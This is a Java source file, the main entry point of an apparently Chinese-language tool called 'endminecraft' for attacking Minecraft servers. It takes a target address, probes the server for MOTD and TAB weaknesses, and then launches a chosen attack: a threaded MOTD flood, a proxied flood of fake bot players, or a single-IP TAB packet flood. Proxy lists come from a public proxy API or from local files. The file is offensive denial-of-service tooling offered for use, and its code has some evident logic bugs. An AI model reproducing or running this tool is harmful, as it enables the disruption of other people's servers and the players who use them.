package me.alikomi.endminecraft;

import me.alikomi.endminecraft.data.BugData;
import me.alikomi.endminecraft.data.InfoData;
import me.alikomi.endminecraft.tasks.attack.DistributedBotAttack;
import me.alikomi.endminecraft.tasks.attack.MotdAttack;
import me.alikomi.endminecraft.tasks.attack.TabWithOneIp;
import me.alikomi.endminecraft.tasks.scan.ScanBug;
import me.alikomi.endminecraft.tasks.scan.ScanInfo;
import me.alikomi.endminecraft.utils.HttpReq;
import me.alikomi.endminecraft.utils.Util;

import java.io.BufferedReader;
import java.io.File;
import java.io.FileReader;
import java.io.IOException;
import java.net.Proxy;
import java.util.*;

public class Main extends Util {

    public static BugData bugData;
    public static InfoData infoData;

    public static String ip;
    public static int port = 25565;

    public static void main(String[] args) throws InterruptedException, IOException {
        Scanner sc = new Scanner(System.in);
        log("请输入ip地址");
        ip = sc.next();
        if (ip.contains(":")) {
            String[] tmpip = ip.split(":");
            ip = tmpip[0];
            port = Integer.parseInt(tmpip[1]);
        } else {
            log("请输入端口（输入错误则为25565）");
            port = sc.nextInt();
        }
        infoData = new InfoData(ip, port);

        log("正在探测服务器信息，请稍后");
        ScanInfo.ScanMotdInfo(ip, port);
        log("是否开始进服前漏洞探测y/n");
        if ("y".equalsIgnoreCase(sc.next())) {
            bugData = new BugData(ip, port);
            ScanBug.scanMOTD(ip, port);
            ScanBug.scanTAB(ip, port);
            log("漏洞检测结果： ");
            log(bugData.toString());
        }

        while (true) {

            log("请输入攻击方式：");
            log("1 : MOTD攻击");
            log("2 : 分布式假人压测");
            log("3 : 单ipTAB压测");
            log("========================");
                switch (sc.nextInt()) {
                    case 1 : {
                        if (bugData != null || !bugData.getMotdBug()) {
                            log("提示！！！！！！！！");
                            log("bug探测时未发现motdbug");
                        }
                        log("MOTD攻击选择");
                        log("请输入攻击时间(ms) ，1蛤=1000ms");//我就是这么暴力
                        int time = sc.nextInt();
                        log("请输入线程数");
                        int thread = sc.nextInt();
                        MotdAttack attack = new MotdAttack(ip,port,time,thread);
                        attack.startAttack();
                        break;
                    }// 1 end
                    case 2: {
                        log("分布式假人压测选择");
                        log("请选择是否开启TAB发包 y/n");
                        boolean tabenable = false;
                        if ("y".equalsIgnoreCase(sc.next())) tabenable = true;
                        log("请输入攻击时长！");
                        int time = sc.nextInt();
                        log("请输入最大攻击数");
                        int maxAttack = sc.nextInt();
                        log("请输入每次加入服务器间隔");
                        int sleepTime = sc.nextInt();
                        log("请输入方式：");
                        log("1.通过API获取");
                        log("2.通过本地获取");
                        Map<Proxy.Type,String> ips;

                        switch (sc.nextInt()) {
                            case 1: {
                                ips = getHttpIp(maxAttack);
                                break;
                            }

                            case 2: {
                                ips = getFileIp(maxAttack);
                                break;
                            }
                            default: {
                                ips = getHttpIp(maxAttack);
                                break;
                            }
                        }

                        new DistributedBotAttack(ip,port,time,maxAttack,sleepTime,ips,tabenable).startAttack();
                        break;
                    }//2 end
                    case 3 : {
                        log("请输入线程数");
                        int thread = sc.nextInt();
                        log("请输入攻击用户名");
                        String username = sc.next();
                        log("请输入代理地址");
                        String pip = sc.next();
                        int pport = 0;
                        if (! pip.contains(":")) {
                            log("请输入代理端口");
                            pport = sc.nextInt();
                        }else {
                            pport = Integer.parseInt(pip.split(":")[1]);
                            pip = pip.split(":")[0];
                        }
                        log("请输入代理方式: 1 - HTTP, 2- SOCKETS");
                        Proxy.Type type = Proxy.Type.SOCKS;
                        if (sc.nextInt() == 1) {
                            type = Proxy.Type.HTTP;
                        }

                        new TabWithOneIp(ip,port,thread,username,type,pip,pport).startAttack();
                    }//3 end
                }

        }
    }

    private static Map<Proxy.Type,String> getHttpIp (int maxAttack) {
        Map<Proxy.Type,String> ips = new HashMap<>();
        String req =HttpReq.sendPost("http://www.89ip.cn/apijk/?&tqsl="+(maxAttack)+"&sxa=&sxb=&tta=&ports=&ktip=&cf=1", "");

        if (req != null && ! req.equalsIgnoreCase("")) {
            String[] arr = req.split("<BR>");
            int a = 0;
            for (String index : arr) {
                a++;
                if (a == 1 || a==2 || a== arr.length || a== arr.length-1) {
                    continue;
                }
                ips.put(Proxy.Type.HTTP,index);
            }
        }else {
            System.exit(1);
        }
        return ips;
    }

    private static Map<Proxy.Type,String> getFileIp (int maxAttack) throws IOException {
        int hs = 0;
        Map<Proxy.Type,String> ips = new HashMap<>();
        File file = new File("sockets.txt");
        BufferedReader reader = new BufferedReader(new FileReader(file));
        String tempString = null;
        // 一次读入一行，直到读入null为文件结束
        while ((tempString = reader.readLine()) != null) {
            // 显示行号
            ips.put(Proxy.Type.SOCKS,tempString);
            hs++;
            if (hs <= maxAttack) return ips;
        }
        reader.close();


        file = new File("https.txt");
        reader = new BufferedReader(new FileReader(file));
        tempString = null;
        // 一次读入一行，直到读入null为文件结束
        while ((tempString = reader.readLine()) != null) {
            // 显示行号
            ips.put(Proxy.Type.HTTP,tempString);
            hs++;
            if (hs <= maxAttack) return ips;
        }
        reader.close();
        return ips;
    }

}
